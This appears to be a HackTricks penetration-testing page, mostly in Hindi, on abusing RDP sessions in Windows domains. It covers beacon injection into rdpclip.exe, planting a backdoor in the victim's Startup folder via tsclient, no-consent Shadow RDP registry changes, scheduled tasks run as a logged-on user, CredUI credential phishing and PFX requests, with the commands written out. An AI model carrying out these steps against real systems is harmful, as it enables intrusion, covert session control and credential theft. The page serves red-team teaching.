# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

यदि **external group** के पास मौजूदा domain के किसी **computer** का **RDP access** है, तो उस computer से समझौता करने वाला attacker, group के किसी सदस्य के connect होने का इंतज़ार कर सकता है।

User के RDP के ज़रिए connect होने पर, **attacker उस user के session में pivot कर सकता है** और external domain में user की permissions का दुरुपयोग कर सकता है।

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

दूसरे tools से sessions **steal करने के अन्य तरीके** [**इस page पर देखें।**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

किसी अन्य domain user का **active console या RDP session** भी एक संभावित lead है, जब उसी host पर आपके पास lower-privileged shell हो। DCOM cross-session activation उस interactive session में किसी उपयुक्त COM server से authenticate करवा सकता है, और RemotePotato0 या KrbRelay जैसे tools उस authentication को capture या relay कर सकते हैं। लॉग-इन user का domain administrator होना ज़रूरी नहीं है: directory का सीमित अधिकार, जैसे gMSA managed password पढ़ने की permission, आगे pivot करने के लिए पर्याप्त हो सकती है।<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

`query user`, `qwinsta`, या मौजूदा winPEAS session inventory से session ID और identity की शुरुआत में जाँच करें। इन्हें relay path का प्रमाण नहीं, बल्कि **संभावित विकल्प** मानें। COM class, उसके impersonation और authentication levels, session accessibility, firewall/OXID routing, target protocol protections, और लॉग-इन principal के प्रभावी अधिकार—ये सभी मायने रखते हैं। KrbRelay cross-session LDAP, HTTP, SMB, और NTLM के उदाहरण दर्ज करता है, लेकिन ये रास्ते version और configuration पर निर्भर करते हैं। LDAP channel binding भी target-side relay barrier है। खास तौर पर, RemotePotato0 project के अनुसार उसका मूल RPC-to-LDAP exploit scenario 2022 में ठीक कर दिया गया था; केवल कोई session दिखने से LDAP relay सफल होने का निष्कर्ष न निकालें।<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

अगर कोई user **RDP के ज़रिए ऐसी machine में access करता है** जहाँ एक **attacker** उसका **इंतज़ार कर रहा हो**, तो attacker **user के RDP session में beacon inject** कर पाएगा। अगर **victim ने RDP से access करते समय अपनी drive mount की हो**, तो **attacker उस तक पहुँच सकता है**।

ऐसी स्थिति में, **statup folder** में **backdoor** लिखकर आप सीधे **victim के मूल computer को compromise** कर सकते हैं।

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

अगर आप ऐसे host पर **local admin** हैं जहाँ victim का पहले से **active RDP session** है, तो आप **password चुराए या LSASS dump किए बिना उस desktop को देख या control कर सकते हैं**।<sup>[[1]](#references)</sup>

यह <sup>[[2]](#references)</sup><sup>[[3]](#references)</sup> में संग्रहीत **Remote Desktop Services shadowing** policy पर निर्भर करता है:

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Interesting मान:

- `0`: अक्षम
- `1`: `EnableInputNotify` (नियंत्रण, उपयोगकर्ता की स्वीकृति आवश्यक)
- `2`: `EnableInputNoNotify` (नियंत्रण, **उपयोगकर्ता की स्वीकृति आवश्यक नहीं**)
- `3`: `EnableNoInputNotify` (केवल देखने की सुविधा, उपयोगकर्ता की स्वीकृति आवश्यक)
- `4`: `EnableNoInputNoNotify` (केवल देखने की सुविधा, **उपयोगकर्ता की स्वीकृति आवश्यक नहीं**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

यह खास तौर पर तब उपयोगी होता है, जब RDP के ज़रिए जुड़े किसी privileged user ने unlocked desktop, KeePass session, MMC console, browser session या admin shell खुला छोड़ दिया हो।

## Logged-On User के रूप में Scheduled Tasks

अगर आप **local admin** हैं और target user **वर्तमान में logged on** है, तो Task Scheduler उस user के **बिना password के** code शुरू कर सकता है।<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

इससे victim का मौजूदा logon session एक execution primitive बन जाता है:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

नोट्स:

- यदि उपयोगकर्ता **लॉग ऑन नहीं है**, तो Windows को आमतौर पर ऐसा task बनाने के लिए password की आवश्यकता होती है जो उस उपयोगकर्ता के रूप में चलता हो।
- यदि उपयोगकर्ता **लॉग ऑन है**, तो task मौजूदा logon context का फिर से उपयोग कर सकता है।
- यह LSASS को छुए बिना victim session के अंदर GUI actions करने या binaries launch करने का एक व्यावहारिक तरीका है।

## Victim Session से CredUI Prompt का दुरुपयोग

जब आप **victim के interactive desktop के अंदर** execute कर सकते हैं (उदाहरण के लिए, **Shadow RDP** के ज़रिए या **उस उपयोगकर्ता के रूप में चल रहे scheduled task** के ज़रिए), तो CredUI APIs का उपयोग करके एक **असली Windows credential prompt** दिखा सकते हैं और victim द्वारा दर्ज किए गए credentials हासिल कर सकते हैं।<sup>[[1]](#references)</sup>

संबंधित APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

सामान्य प्रक्रिया:

1. Victim session में एक binary चलाएँ।
2. ऐसा domain-authentication prompt दिखाएँ जो मौजूदा domain की branding से मेल खाता हो।
3. लौटाए गए auth buffer को unpack करें।
4. दिए गए credentials validate करें और वैकल्पिक रूप से, valid credentials दर्ज किए जाने तक prompt दिखाते रहें।

यह **on-host phishing** के लिए उपयोगी है, क्योंकि prompt किसी नकली HTML form के बजाय standard Windows APIs द्वारा render किया जाता है।

## Victim के Context में PFX का अनुरोध करना

**scheduled-task-as-user** primitive का उपयोग **लॉग ऑन victim के रूप में certificate/PFX का अनुरोध करने** के लिए भी किया जा सकता है। बाद में उस certificate का उपयोग उस उपयोगकर्ता के रूप में **AD authentication** के लिए किया जा सकता है, जिससे password चुराने की ज़रूरत नहीं पड़ती।<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

उच्च-स्तरीय प्रक्रिया:

1. ऐसे host पर **local admin** access हासिल करें जहाँ victim लॉग ऑन है।
2. **scheduled task** का उपयोग करके victim के रूप में enrollment/export logic चलाएँ।
3. इससे प्राप्त **PFX** export करें।
4. PKINIT / certificate-based AD authentication के लिए PFX का उपयोग करें।

आगे के दुरुपयोग के लिए AD CS पेज देखें:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - tiering models के साथ flat networks से locked-up domains तक](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc` shadow-session विकल्प](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - scheduled task के ज़रिए PFX का अनुरोध करने वाला PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - cross-session DCOM activation और मौजूदा सीमाएँ](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - cross-session relay के उदाहरण और CLSID की आवश्यकताएँ](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query session command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding और relay protection](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
